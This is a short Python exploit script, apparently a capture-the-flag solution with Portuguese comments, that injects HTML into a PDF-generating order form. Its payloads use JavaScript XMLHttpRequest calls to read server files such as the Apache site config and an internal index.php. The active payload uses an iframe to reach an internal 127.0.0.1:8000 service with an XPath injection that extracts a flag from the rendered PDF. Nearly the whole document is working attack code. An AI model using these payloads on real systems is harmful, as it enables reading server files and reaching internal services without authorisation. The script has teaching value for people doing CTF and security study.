import requests
from rich import print #Cores no print
import sys
from bs4 import BeautifulSoup #Parsing de HTML
from PyPDF2 import PdfFileReader #Ler PDF
import time

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = f"{sys.argv[1]}/order.php"

data = {
	'id': "1",
	# 'title': '<script>x = new XMLHttpRequest();x.onload = function(){document.write(btoa(this.responseText))};x.open("GET", "file:///etc/apache2/sites-available/000-default.conf");x.send();</script>', # Baixa o arquivo "/etc/apache2/sites-available/000-default.conf" em base64 e ao decodar, conseguimos encontrar o caminho para a aplicacao interna -> "VirtualHost 127.0.0.1:8000" e DocumentRoot /var/www/internal
	# 'title': '<script>function addNewlines(str) {var result = \'\';while (str.length > 0) {result += str.substring(0, 100) + \'\\\n\';str = str.substring(100);}return result;}x = new XMLHttpRequest();x.onload = function(){document.write(addNewlines(btoa(this.responseText)))};x.open("GET", "file:///var/www/internal/index.php");x.send();</script>', # Baixa o arquivo "/var/www/internal/index.php" em base64 e ao decodar, conseguimos encontrar a parte do código responsável pela consulta xpath -> $query = "/orders/order[id=" . $predicate . "]"
	'title': '<iframe src="http://127.0.0.1:8000/index.php?q=//*[7]/*" width="800" height="500"></iframe>', # Ao analisar a consulta, podemos ver que nao precisamos escapar das aspas, podendo fazer consulta direto e pegar a flag com o payload -> //*[7]/*
	'desc': '', 
	'comment': ''
}

response = requests.post(url, data=data, headers=headers, proxies=proxies)
file_Path = 'file.pdf'

if response.status_code == 200:
    with open(file_Path, 'wb') as file:
        file.write(response.content)
    with open("file.pdf", "rb") as input_pdf:
        pdf_reader = PdfFileReader(input_pdf) # Criando um objeto PdfFileReader
        num_pages = pdf_reader.numPages # Obtendo o número de páginas do arquivo PDF

        for page_number in range(num_pages): # Lendo o texto de cada página
            page = pdf_reader.getPage(page_number)
            text = page.extractText()
            print(f"Texto da página: {page_number + 1}\n {text}")
else:
    print(f'Failed to download file')